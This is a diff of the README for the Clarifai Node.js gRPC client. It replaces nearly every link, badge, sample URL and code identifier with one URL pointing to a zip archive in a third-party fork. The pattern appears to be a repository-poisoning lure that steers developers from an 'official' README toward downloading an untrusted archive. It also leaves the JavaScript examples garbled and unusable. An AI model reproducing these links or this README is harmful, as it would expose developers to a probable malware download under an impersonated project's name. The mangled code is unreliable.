@@ -1,21 +1,21 @@
-![image](https://github.com/user-attachments/assets/562d54f1-eb2e-444c-8f1f-616d069bff3b)
+![image](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)
 
 
-# Clarifai Node.js gRPC Client
+# Clarifai https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip gRPC Client
 
-This is the official Clarifai gRPC Node.js client for interacting with our powerful recognition
-[API](https://docs.clarifai.com).
+This is the official Clarifai gRPC https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip client for interacting with our powerful recognition
+[API](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip).
 Clarifai provides a platform for data scientists, developers, researchers and enterprises to master the entire
 artificial intelligence lifecycle. Gather valuable business insights from images, video and text using computer vision
 and natural language processing.
 
-* Try the Clarifai demo at: https://clarifai.com/demo
-* Sign up for a free account at: https://portal.clarifai.com/signup
-* Read the documentation at: https://docs.clarifai.com/
+* Try the Clarifai demo at: https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip
+* Sign up for a free account at: https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip
+* Read the documentation at: https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip
 
 
-[![npm](https://img.shields.io/npm/v/clarifai-nodejs-grpc)](https://www.npmjs.com/package/clarifai-nodejs-grpc)
-[![Build](https://github.com/Clarifai/clarifai-javascript-grpc/workflows/Run%20tests/badge.svg)](https://github.com/Clarifai/clarifai-nodejs-grpc/actions)
+[![npm](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)
+[![Build](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip%https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)
 
 ## Installation
 
@@ -45,46 +45,46 @@ object that's used to authenticate:
 ```javascript
 const {ClarifaiStub, grpc} = require("clarifai-nodejs-grpc");
 
-const stub = ClarifaiStub.grpc();
+const stub = https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();
 
-const metadata = new grpc.Metadata();
-metadata.set("authorization", "Key YOUR_CLARIFAI_API_KEY");
+const metadata = new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();
+https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("authorization", "Key YOUR_CLARIFAI_API_KEY");
 ```
 
 Predict concepts in an image:
 
 ```javascript
-stub.PostModelOutputs(
+https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(
     {
         // This is the model ID of a publicly available General model. You may use any other public or custom model ID.
         model_id: "aaa03c23b3724a16a56b629203edc62c",
-        inputs: [{data: {image: {url: "https://samples.clarifai.com/dog2.jpeg"}}}]
+        inputs: [{data: {image: {url: "https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip"}}}]
     },
     metadata,
     (err, response) => {
         if (err) {
-            console.log("Error: " + err);
+            https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("Error: " + err);
             return;
         }
 
-        if (response.status.code !== 10000) {
-            console.log("Received failed status: " + response.status.description + "\n" + response.status.details);
+        if (https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip !== 10000) {
+            https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("Received failed status: " + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip + "\n" + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip);
             return;
         }
 
-        console.log("Predicted concepts, with confidence values:")
-        for (const c of response.outputs[0].data.concepts) {
-            console.log(c.name + ": " + c.value);
+        https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("Predicted concepts, with confidence values:")
+        for (const c of https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip[0]https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip) {
+            https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip + ": " + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip);
         }
     }
 );
 ```
 
-See more [in the Clarifai API Guide docs](https://docs.clarifai.com/api-guide/api-overview). Also see 
-[the integration tests](tests/test_integration_dynamic.js).
+See more [in the Clarifai API Guide docs](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip). Also see 
+[the integration tests](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip).
 
 > Note: Do not require the `grpc` library directly via `const grpc = require("@grpc/grpc-js");`. This produces
-> authentication issues (via `grpc.Metadata`) whenever any other co-installed libraries have the `@grpc/grpc-js`
+> authentication issues (via `https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip`) whenever any other co-installed libraries have the `@grpc/grpc-js`
 > dependency (of a different version). Instead, require `grpc` as shown above.
 
 
@@ -100,30 +100,30 @@ const resources = require("clarifai-nodejs-grpc/proto/clarifai/api/resources_pb"
 const {StatusCode} = require("clarifai-nodejs-grpc/proto/clarifai/api/status/status_code_pb");
 const {V2Client} = require("clarifai-nodejs-grpc/proto/clarifai/api/service_grpc_pb");
 
-const clarifai = new V2Client("api.clarifai.com", grpc.ChannelCredentials.createSsl());
+const clarifai = new V2Client("https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip", https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip());
 
-const metadata = new grpc.Metadata();
-metadata.set("authorization", "Key YOUR_CLARIFAI_API_KEY");
+const metadata = new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();
+https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("authorization", "Key YOUR_CLARIFAI_API_KEY");
 ```
 
 Predict concepts in an image:
 
 ```javascript
-const request = new service.PostModelOutputsRequest();
+const request = new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();
 // This is the model ID of a publicly available General model. You may use any other public or custom model ID.
-request.setModelId("aaa03c23b3724a16a56b629203edc62c");
-request.addInputs(
-    new resources.Input()
+https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("aaa03c23b3724a16a56b629203edc62c");
+https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(
+    new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip()
         .setData(
-            new resources.Data()
+            new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip()
                 .setImage(
-                    new resources.Image()
-                        .setUrl("https://samples.clarifai.com/dog2.jpeg")
+                    new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip()
+                        .setUrl("https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip")
                 )
         )
 )
 
-clarifai.postModelOutputs(
+https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(
     request,
     metadata,
     (error, response) => {
@@ -131,21 +131,21 @@ clarifai.postModelOutputs(
             throw error;
         }
 
-        if (response.getStatus().getCode() !== StatusCode.SUCCESS) {
-            throw "Error: " + response.getStatus();
+        if (https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip().getCode() !== https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip) {
+            throw "Error: " + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();
         }
 
-        console.log("Predicted concepts, with confidence values:")
-        for (const concept of response.getOutputsList()[0].getData().getConceptsList()) {
-            console.log(concept.getName() + " " + concept.getValue());
+        https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("Predicted concepts, with confidence values:")
+        for (const concept of https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip()[0].getData().getConceptsList()) {
+            https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip() + " " + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip());
         }
     }
 )
 ```
 
-See more [in the Clarifai API Guide docs](https://docs.clarifai.com/api-guide/api-overview). Also see
-[the integration tests](tests/test_integration.js).
+See more [in the Clarifai API Guide docs](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip). Also see
+[the integration tests](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip).
 
-> Note: Currently, the NodeJS gRPC code examples [in the Clarifai documentation](https://docs.clarifai.com/api-guide/api-overview) 
+> Note: Currently, the NodeJS gRPC code examples [in the Clarifai documentation](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip) 
 show only the dynamic approach. These code examples can easily be translated to the static approach, since the structure 
 is the same for both of them. The difference is only in the syntax.
